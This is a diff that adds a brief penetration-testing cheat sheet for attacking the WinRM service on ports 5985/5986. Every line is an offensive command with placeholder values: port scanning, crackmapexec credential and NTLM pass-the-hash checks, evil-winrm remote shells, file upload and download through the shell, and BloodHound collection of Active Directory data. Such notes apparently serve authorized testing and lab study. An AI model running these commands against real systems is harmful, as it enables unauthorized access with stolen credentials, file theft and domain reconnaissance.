@@ -1,0 +1,16 @@
+PORT 5985/5986 — WINRM
+bashnmap -p 5985,5986 target
+crackmapexec winrm target -u user -p pass
+crackmapexec winrm target -u user -H NTLM_HASH
+
+# Shell
+evil-winrm -i target -u user -p pass
+evil-winrm -i target -u user -H NTLM_HASH
+
+# Upload/download inside evil-winrm
+upload /local/file.exe
+download C:\path\file.txt
+
+# Load powershell scripts
+evil-winrm -i target -u user -p pass -s /path/to/ps1scripts/
+Invoke-BloodHound -CollectionMethod All
